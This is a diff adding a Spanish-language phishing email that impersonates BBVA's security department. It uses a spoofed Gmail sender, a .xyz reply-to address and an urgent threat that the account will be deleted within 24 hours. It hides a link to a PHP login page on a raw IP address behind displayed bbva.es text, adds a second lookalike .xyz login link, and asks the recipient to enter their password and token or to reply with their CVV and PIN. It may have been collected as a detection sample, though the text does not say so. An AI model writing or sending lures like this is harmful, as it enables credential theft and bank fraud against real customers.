@@ -1,0 +1,22 @@
+From: "Departamento de Seguridad BBVA" <alerta.seguridad882@gmail.com>
+Reply-To: soporte-verificacion@recuperacion-cuenta-segura.xyz
+Subject: ¡URGENTE! Su cuenta ha sido suspendida temporalmente - Acción Requerida
+
+Estimado cliente:
+
+Hemos detectado un intento de inicio de sesión no autorizado y actividad sospechosa en su cuenta de banca en línea y vinculación con P4yPal. Por motivos de protección, hemos aplicado un bloqueo inmediato a sus tarjetas.
+
+Para evitar que su cuenta sea eliminada definitivamente en las próximas 24 horas, es obligatorio verificar su cuenta y confirmar su identidad inmediatamente.
+
+Haga clic en nuestro portal seguro a continuación para ingresar su contraseña y validar su token de seguridad:
+
+<a href="http://185.220.101.45/login-banco/verificar.php">https://www.bbva.es/personas/seguridad</a>
+
+Enlace alternativo de validación:
+http://bbva-seguridad-acceso.xyz/login
+
+Si no completa este proceso hoy, no podrá realizar pagos ni retirar fondos. En caso de dudas, responda con su código CVV y número de PIN para desbloqueo manual.
+
+Atentamente,
+Soporte Técnico de Seguridad Bancaria ¡¡¡ACTÚE AHORA MISMO!!!
+
